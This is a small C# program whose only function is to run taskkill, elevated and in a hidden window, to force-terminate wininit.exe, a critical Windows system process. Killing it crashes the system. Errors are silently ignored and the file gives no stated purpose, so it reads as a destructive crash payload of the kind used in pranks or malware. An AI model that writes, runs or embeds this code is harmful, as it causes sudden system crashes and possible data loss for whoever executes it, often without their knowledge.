using System;
using System.Diagnostics;

namespace TaskKill_Wininit {
    public abstract class Program {
        private static void Main() {
            TaskKill_Wininit();
        }

        public static void TaskKill_Wininit() {
            try {
                var process = new Process {
                    StartInfo = new ProcessStartInfo {
                        WindowStyle = ProcessWindowStyle.Hidden,
                        FileName = "taskkill",
                        Arguments = "-f -im wininit.exe",
                        UseShellExecute = true,
                        Verb = "runas"
                    }
                };
                process.Start();
            } catch (Exception) {
                // ignored
            }
        }
    }
}
